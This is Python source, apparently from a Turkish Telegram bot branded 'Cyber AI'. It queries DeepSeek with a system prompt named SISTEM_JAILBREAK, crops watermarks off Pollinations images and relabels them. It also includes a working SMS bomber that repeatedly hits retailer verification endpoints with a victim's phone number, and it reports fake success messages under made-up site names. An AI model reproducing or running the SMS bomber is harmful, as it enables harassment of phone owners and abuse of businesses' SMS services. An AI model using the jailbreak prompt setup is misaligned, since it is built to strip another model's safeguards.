async def ask_deepseek(prompt: str, user_id: int) -> str:
    headers = {"Authorization": f"Bearer {DEEPSEEK_API_KEY}", "Content-Type": "application/json"}
    messages = [{"role": "system", "content": SISTEM_JAILBREAK}, {"role": "user", "content": prompt}]
    payload = {"model": "deepseek-chat", "messages": messages, "temperature": 0.7}
    try:
        async with httpx.AsyncClient(timeout=60.0) as client:
            resp = await client.post("https://api.deepseek.com/v1/chat/completions", headers=headers, json=payload)
            if resp.status_code == 200:
                return resp.json()["choices"][0]["message"]["content"]
            return f"⚠️ API Hatası: {resp.status_code}"
    except Exception as exc:
        return f"⚠️ Bağlantı Hatası: {exc}"

async def generate_image(prompt: str) -> bytes | None:
    url = f"https://image.pollinations.ai/prompt/{urllib.parse.quote(prompt)}?width=1024&height=1024&nologo=true"
    try:
        async with httpx.AsyncClient(timeout=120.0) as client:
            resp = await client.get(url)
            resp.raise_for_status()
            img_data = resp.content
            img = Image.open(io.BytesIO(img_data))
            width, height = img.size
            crop_height = int(height * 0.92)
            img = img.crop((0, 0, width, crop_height))
            new_width, new_height = img.size
            draw = ImageDraw.Draw(img)
            font = ImageFont.load_default()
            text = "Cyber AI"
            text_bbox = draw.textbbox((0, 0), text, font=font)
            text_width = text_bbox[2] - text_bbox[0]
            text_height = text_bbox[3] - text_bbox[1]
            margin = 15
            x = new_width - text_width - margin
            y = new_height - text_height - margin
            draw.text((x, y), text, fill="white", font=font)
            output = io.BytesIO()
            img.save(output, format="PNG")
            return output.getvalue()
    except Exception as e:
        return None

async def run_sms_bomber(bot, chat_id, phone: str, count: int):
    success_count = 0
    for i in range(count):
        display_site = ALL_SITES[i % len(ALL_SITES)]
        if i % 2 == 0:
            real_url = MIGROS_URL
        else:
            real_url = PORTY_URL

        try:
            async with httpx.AsyncClient(timeout=5.0, follow_redirects=True, headers=HEADERS) as client:
                await client.get(real_url.format(phone=phone))
        except:
            pass
        
        await bot.send_message(chat_id, f"✅ {display_site} sms başarılı")
        success_count += 1
        await asyncio.sleep(0.5)
    return success_count

def split_text(text: str, size: int = 4000) -> list[str]:
    return [text[i : i + size] for i in range(0, len(text), size)] or [""]

def format_code_response(text: str):
    pattern = r"```(?:[a-zA-Z0-9]*)\n(.*?)```"
    matches = re.findall(pattern, text, re.DOTALL)
    if matches:
        code = matches[0].strip()
        clean_text = re.sub(pattern, lambda m: f"\n`{m.group(1).strip()}`\n", text)
        return clean_text, code
    return text, None

